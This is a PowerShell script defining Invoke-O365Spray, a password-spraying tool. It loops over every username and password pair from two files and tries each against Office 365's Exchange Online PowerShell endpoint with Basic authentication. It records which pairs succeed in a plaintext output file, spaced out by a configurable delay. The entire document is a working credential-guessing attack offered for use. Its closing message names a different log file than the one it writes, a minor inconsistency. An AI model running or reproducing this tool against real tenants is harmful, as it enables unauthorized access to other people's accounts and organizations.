function Invoke-O365Spray
{
    Param
    (
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $UsernameFile,

        [Parameter(Position = 1, Mandatory = $True)]
        [String]
        $PasswordFile,

        [Parameter(Position = 2, Mandatory = $True)]
        [Int]
        $Interval
    )

    $scriptBlock = {
    param($username, $password, $outputpath)    
        $password_sec = $password | ConvertTo-SecureString -asPlainText -Force
        $O365Cred = New-Object System.Management.Automation.PSCredential($username,$password_sec) -ErrorAction Continue

        $O365Session = New-PSSession –ConfigurationName Microsoft.Exchange -ConnectionUri https://ps.outlook.com/powershell -Credential $O365Cred -Authentication Basic -AllowRedirection -ErrorVariable psconnect_error -ErrorAction SilentlyContinue -WarningAction silentlyContinue
        if($psconnect_error){
            Add-Content "$($outputpath)\spray_output.txt" "[-] $($username):$($password)"
        }
        else {
            Add-Content "$($outputpath)\spray_output.txt" "[+] $($username):$($password)"
        }
    }

    $nr_usernames = Get-Content $UsernameFile | Measure-Object
    $nr_passwords = Get-Content $PasswordFile | Measure-Object
    $nr_tries = ($nr_usernames.Count * $nr_passwords.Count)
    $nr_tried = 1

    foreach ($username in get-content $UsernameFile)
     {
        foreach ($password in get-content $PasswordFile)
        {
            Start-Job -ScriptBlock $scriptBlock -ArgumentList $username, $password, $PSScriptRoot | Out-Null
            Write-Output "Authentication attempt $($nr_tried)/$($nr_tries)"
            $nr_tried += 1
            Start-Sleep $Interval
        }
     }
     Write-Output "Done... check spray_log.txt for results"
 }
